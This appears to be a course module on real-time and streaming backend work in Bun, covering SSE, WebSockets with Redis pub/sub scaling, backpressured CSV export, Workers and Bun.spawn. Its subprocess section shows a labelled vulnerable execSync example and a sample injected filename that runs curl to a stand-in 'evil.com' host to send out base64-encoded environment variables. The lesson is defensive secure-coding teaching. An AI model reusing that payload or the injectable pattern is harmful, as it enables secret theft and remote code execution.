# Module 11 — Real-Time (WebSockets & SSE), Horizontal Scaling, Web Streams, Backpressure, Workers & Subprocesses

> **Course Phase**: Phase 23 (Sections 51–58, 105)
> **Verified Primitives**: `Bun.serve` WebSockets, `ReadableStream`, `TransformStream`, Redis Pub/Sub, `new Worker()`, `Bun.spawn()`

---

## 1. Concept: Polling vs Server-Sent Events (SSE) vs WebSockets (Section 51)

Do not reach for WebSockets by default for every real-time feature. Pick the right protocol for the communication pattern:

| Protocol | Direction | Transport | Auto-Reconnect? | Best Production Use Cases |
| :--- | :--- | :--- | :--- | :--- |
| **Short Polling** | Client → Server | Repeated HTTP `GET` | Yes (Timer) | Simple status checks every 30–60s; cacheable via CDN/ETag. |
| **Server-Sent Events (SSE)** | **Unidirectional** (Server → Client) | Standard HTTP/1.1 or HTTP/2 `text/event-stream` | **Built into browser `EventSource`** (`Last-Event-ID`) | Live job progress bars, AI token streaming, live order status feeds, dashboard tickers. Works effortlessly through corporate proxies and HTTP/2 multiplexing! |
| **WebSockets (WS)** | **Bidirectional Full-Duplex** (Client ↔ Server) | HTTP `101 Switching Protocols` TCP upgrade | Manual client backoff loop required | Collaborative editing, bidirectional chat, high-frequency multiplayer state, interactive terminal sessions. |

---

## 2. Server-Sent Events (SSE) for Live Job Progress (Section 53)

SSE is a standard HTTP `Response` with `Content-Type: text/event-stream` and a `ReadableStream` body. Both Hono (`streamSSE` from `hono/streaming`) and Elysia (generator functions / `ReadableStream`) support it natively.

```typescript
// src/modules/notifications/sse-progress.ts
export function createJobProgressSSEResponse(req: Request, jobId: string): Response {
  const encoder = new TextEncoder();

  const stream = new ReadableStream({
    async start(controller) {
      const sendEvent = (event: string, data: unknown, id?: string) => {
        if (req.signal.aborted) return;
        const idLine = id ? `id: ${id}\n` : "";
        const payload = `${idLine}event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
        controller.enqueue(encoder.encode(payload));
      };

      // Heartbeat comment every 15s prevents reverse proxies from closing idle connections
      const heartbeat = setInterval(() => {
        if (!req.signal.aborted) {
          controller.enqueue(encoder.encode(`: heartbeat ${Date.now()}\n\n`));
        }
      }, 15_000);

      req.signal.addEventListener("abort", () => {
        clearInterval(heartbeat);
        controller.close();
      });

      sendEvent("progress", { jobId, percent: 10, status: "started" }, "1");
    },
  });

  return new Response(stream, {
    status: 200,
    headers: {
      "Content-Type": "text/event-stream; charset=utf-8",
      "Cache-Control": "no-cache, no-transform",
      Connection: "keep-alive",
      "X-Accel-Buffering": "no", // Disables Nginx response buffering for instant streaming!
    },
  });
}
```

---

## 3. WebSockets & Horizontal Real-Time Scaling Across Multiple Servers (Sections 52, 54, 105)

### Why Single-Server WebSocket State Breaks When Scaling (Section 54)

Suppose you run **3 Bun API instances** behind a load balancer:
- **User A** (Organization `org_1`) has an open WebSocket connected to **Server 1**.
- **User B** (Organization `org_1`) submits `POST /api/v1/orders`, which the load balancer routes to **Server 2** (or a **BullMQ Worker** finishes processing an order on a Worker node).
- If Server 2 calls `server.publish("org:org_1:notifications", msg)` locally, **User A on Server 1 never receives the message** because `Bun.serve` pub/sub only broadcasts to sockets connected to that specific OS process!

### Architecture: Redis Pub/Sub Bridge Across Server 1, Server 2, Server 3

```text
  [Worker / Server 2]
          │
          │ 1. redisPub.publish("ws:broadcast", JSON.stringify({ topic, payload }))
          ▼
  ┌───────────────────┐
  │   Redis Pub/Sub   │
  └───┬───────────┬───┘
      │           │ 2. Fan-out to all subscribed Bun API instances
      ▼           ▼
[Server 1]   [Server 3]
      │           │ 3. bunServer.publish(topic, payload)
      ▼           ▼
 (Client A)   (Client C)
```

### Real-Time Security Checklist (Section 105)
1. **Authenticate on Upgrade**: Verify the session cookie or short-lived ticket before calling `server.upgrade(req, { data: { userId, organizationId } })`.
2. **Enforce Tenant Isolation on Topics**: Never let a client send `{ "subscribe": "org:other_tenant" }` and blindly pass that string to `ws.subscribe()`. Construct the topic server-side from `ws.data.organizationId` (`org:${ws.data.organizationId}:events`).
3. **Bound Payload Size & Rate**: Configure `maxPayloadLength: 64 * 1024` (64KB) and `idleTimeout: 60` in `Bun.serve({ websocket: ... })`, and validate every incoming WebSocket message with Zod v4 / TypeBox.

---

## 4. Web Streams & Backpressure: Large CSV Export (Sections 55–56)

### What Is Backpressure? (Section 56)
When a **producer** (e.g., PostgreSQL cursor or file reader generating rows at 200 MB/s) is faster than a **consumer** (e.g., a mobile client on a 2 MB/s 4G connection), buffering all rows in memory (`const allRows = await db.select()...`) causes your container's RAM usage to spike to several gigabytes and crash with an Out-Of-Memory (`OOMKilled`) error!

With **Web `ReadableStream`**, the `pull(controller)` method is **only invoked by the runtime when the client's TCP send buffer has drained and is ready for the next chunk** (`controller.desiredSize > 0`). Memory usage stays flat (`~5 MB`) whether exporting 1,000 rows or 10,000,000 rows!

```typescript
// src/modules/orders/order-csv-stream.ts
export interface OrderExportRow {
  id: string;
  createdAt: string;
  status: string;
  totalCents: number;
}

export function streamOrdersCsvResponse(
  req: Request,
  fetchBatchByCursor: (cursor: string | null, limit: number) => Promise<OrderExportRow[]>,
): Response {
  const encoder = new TextEncoder();
  let cursor: string | null = null;
  let headerSent = false;
  const batchSize = 500;

  const stream = new ReadableStream<Uint8Array>({
    // `pull` is called ONLY when the downstream HTTP socket is ready for more bytes (Backpressure!)
    async pull(controller) {
      if (req.signal.aborted) {
        controller.close();
        return;
      }

      if (!headerSent) {
        controller.enqueue(encoder.encode("id,created_at,status,total_cents\n"));
        headerSent = true;
      }

      const batch = await fetchBatchByCursor(cursor, batchSize);
      if (batch.length === 0) {
        controller.close();
        return;
      }

      let csvChunk = "";
      for (const row of batch) {
        // Escape CSV injection characters (=, +, -, @) at start of fields if exporting user strings
        csvChunk += `${row.id},${row.createdAt},${row.status},${row.totalCents}\n`;
      }

      cursor = batch[batch.length - 1]!.id;
      controller.enqueue(encoder.encode(csvChunk));

      if (batch.length < batchSize) {
        controller.close();
      }
    },
  });

  return new Response(stream, {
    status: 200,
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": 'attachment; filename="orders-export.csv"',
      "Cache-Control": "no-store",
    },
  });
}
```

> **Note on Bun v1.4.1+ WebSockets Backpressure**: In Bun `v1.4.1+`, `ServerWebSocket` also supports `ws.pause()` and `ws.resume()` to apply TCP backpressure on incoming WebSocket frames when an async message handler is busy.

---

## 5. Bun Workers & Subprocesses (Sections 57–58)

### 1. Bun `Worker` Threads for CPU-Bound Tasks (Section 57)
JavaScript execution in `Bun.serve()` is single-threaded per process. Running a 400ms synchronous CPU task (e.g., parsing a 50MB CSV report, generating complex cryptographic proofs, or image manipulation) on the main thread freezes **all** HTTP requests for 400ms.
Offload CPU-bound work inside the process using Web-standard `new Worker(new URL("./report.worker.ts", import.meta.url).href)`:
- Use **`postMessage(data, [arrayBuffer])`** with **Transferable `ArrayBuffer`s** for zero-copy memory transfer between the main thread and the worker thread.

### 2. Subprocesses with `Bun.spawn()` & Preventing Command Injection (Section 58)

### ❌ BAD EXAMPLE: Shell Command Injection Vulnerability

```typescript
// ❌ CRITICAL VULNERABILITY (Remote Code Execution / Command Injection!):
// If user passes `filename = "report.pdf; curl https://evil.com/steal?env=$(env | base64)"`,
// passing an interpolated string to `sh -c` executes arbitrary attacker commands!
import { execSync } from "node:child_process";
execSync(`pdftotext /tmp/${userProvidedFilename} -`);
```

### ✅ PRODUCTION PATTERN: Array Arguments in `Bun.spawn()` (Zero Shell Interpolation)

`Bun.spawn([binary, ...args])` invokes `posix_spawn` / `execve` directly **without** spawning a shell (`/bin/sh`). Arguments are passed as raw OS `argv` pointers, making shell metacharacters (`;`, `|`, `&&`, `$()`) completely inert—plus you should still validate the input against a strict allowlist/UUID pattern!

```typescript
// src/infrastructure/subprocess/safe-spawn.ts
export async function runSafeSubprocess(params: {
  cmd: [string, ...string[]];
  timeoutMs?: number;
}): Promise<{ exitCode: number; stdout: string; stderr: string }> {
  const proc = Bun.spawn(params.cmd, {
    stdin: "ignore",
    stdout: "pipe",
    stderr: "pipe",
    timeout: params.timeoutMs ?? 10_000, // Automatic kill if subprocess hangs!
    env: {
      PATH: "/usr/local/bin:/usr/bin:/bin", // Never leak DATABASE_URL or JWT_SECRET to child processes!
    },
  });

  const [stdout, stderr, exitCode] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
    proc.exited,
  ]);

  return { exitCode, stdout, stderr };
}
```

---

## 6. Exercises & Architecture Challenge

- **Beginner**: Write a `bun:test` test for `streamOrdersCsvResponse` that streams 3 batches of 2 rows each and verifies the complete CSV text output.
- **Intermediate**: Build a `TransformStream` that compresses an outgoing CSV stream with `new CompressionStream("gzip")` when the request includes `Accept-Encoding: gzip`.
- **Architecture Challenge**: *Why did we pass an explicit minimal `env: { PATH: "..." }` object to `Bun.spawn()` instead of inheriting `process.env` by default?* (Answer: By default, child processes inherit all environment variables of the parent Bun process—including `DATABASE_URL`, `JWT_SECRET`, and `S3_SECRET_ACCESS_KEY`. If the child binary (e.g., ImageMagick or a third-party CLI) has a CVE or logs its environment on crash, your production secrets are compromised).
